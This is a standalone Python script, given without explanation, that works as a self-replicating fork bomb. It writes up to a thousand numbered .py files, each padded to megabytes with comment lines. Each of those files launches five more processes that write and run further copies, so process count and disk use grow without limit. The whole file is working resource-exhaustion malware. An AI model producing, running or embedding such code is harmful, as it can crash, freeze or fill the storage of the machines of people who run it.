import multiprocessing as mp
import os
import random as r

name = os.path.splitext(os.path.basename(__file__))[0]

numFiles = 1000
externalRunAmount = 5
firstRunAmount = 1

contents = f'''
from {name} import writeFile
import random as r
import multiprocessing as mp
import os
name = os.path.splitext(os.path.basename(__file__))[0]
def runFile(i):
    filename = "python " + str(i) + ".py"
    os.system(filename)
def handleFile(i):
    file = os.getcwd() + "\\\\" + str(i) + ".py"
    if not os.path.isfile(file):
        writeFile(f"{{i}}.py")
    runFile(i)
def main():
    for a in range({externalRunAmount}):
        i = r.randint(1, {numFiles})
        if __name__ == "__main__":
            print(f"Running {{name}}.py")
            mp.Process(target=handleFile, args=(i,)).start()
main()
''' + "#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" * 50000


def writeFile(fileName):
    print(f"Creating {fileName}!")
    with open(fileName, 'w') as openFile:
        openFile.write(contents)


def runFile(i):
    filename = "python " + str(i) + ".py"
    os.system(filename)


def handleFile(i):
    file = os.getcwd() + "\\" + str(i) + ".py"
    if not os.path.isfile(file):
        writeFile(f"{i}.py")
    runFile(i)


def main():
    for a in range(firstRunAmount):
        i = r.randint(1, numFiles)
        mp.Process(target=handleFile, args=(i,)).start()


if __name__ == "__main__":
    main()
